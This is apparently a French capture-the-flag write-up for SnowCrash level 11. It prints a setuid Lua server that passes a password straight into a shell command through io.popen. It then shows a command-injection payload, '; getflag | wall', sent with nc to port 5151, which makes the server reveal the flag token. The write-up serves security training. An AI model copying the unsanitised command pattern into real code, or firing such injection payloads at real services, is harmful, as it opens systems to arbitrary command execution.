Avec la commande **ls**, on trouve le fichier **level11.lua**

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

En l'examinant, on trouve que c'est un serveur qui va accepter des requêtes de connexion sur le port **5151**, et qui demandera un mot de passe pour se connecter.

```bash
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Le mot de passe doit avoir son hash avec sha1sum égal à `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`.

Pour cela, on va sur le site [dcode](https://www.dcode.fr/hash-sha1)

On obtient le résultat : `NotSoEasy`.

Évidemment, ce mot de passe n'est pas le bon, car il permet de se connecter ni à **flag11** ni à **level12**.

```bash
level11@SnowCrash:~$ su flag11
Password: 
su: Authentication failure
level11@SnowCrash:~$ su level12
Password: 
su: Authentication failure
```

Il faut donc trouver un autre moyen de récupérer le flag.

En regardant plus en détail le code, la commande qu'utilise le script est une concaténation de `echo ` + {le mot de passe} + ` | sha1sum`

On peut donc exploiter cette partie en utilisant la commande `getflag`.

```bash
level11@SnowCrash:~$ echo "; getflag | wall" | nc 127.0.0.1 5151

Broadcast Message from flag11@Snow
        (somewhere) at XX:XX ...

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Erf nope..
```

